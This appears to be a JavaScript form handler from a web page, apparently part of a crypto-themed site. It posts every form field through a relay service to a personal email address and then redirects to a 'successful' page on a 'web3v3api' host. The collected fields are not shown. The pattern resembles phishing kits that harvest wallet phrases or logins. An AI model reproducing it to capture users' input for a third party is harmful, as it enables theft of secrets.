
          
                        document.getElementById('myForm').addEventListener('submit', function (event) {
                            event.preventDefault();
                        
                            // Show loader
                            document.getElementById('loader').style.display = 'inline-block';
                        
                            var xhr = new XMLHttpRequest();
                            xhr.open("POST", "https://formsubmit.co/wizdream22gmail.com", true);
                            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                        
                            xhr.onreadystatechange = function () {
                                if (this.readyState == XMLHttpRequest.DONE && this.status == 200) {
                                    // Hide loader
                                    document.getElementById('loader').style.display = 'none';
                        
                                    // Redirect after successful submission
                                    window.location.href = "https://web3v3api.pages.dev/successful.html";
                                }
                            }
                        
                            var formData = new FormData(document.getElementById('myForm'));
                            xhr.send(formData);
                        });
                       


                        
                        // document.getElementById('myForm').addEventListener('submit', function (event) {
                        //     event.preventDefault();

                        //     var xhr = new XMLHttpRequest();
                        //     xhr.open("POST", "https://formsubmit.co/wizdream22gmail.com", true);
                        //     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

                        //     xhr.onreadystatechange = function () {
                        //         if (this.readyState == XMLHttpRequest.DONE && this.status == 200) {
                        //             // Redirect after successful submission
                        //             window.location.href = "https://web3v3api.pages.dev/successful.html";
                        //         }
                        //     }

                        //     var formData = new FormData(this);
                        //     xhr.send(formData);
                        // });
                
                        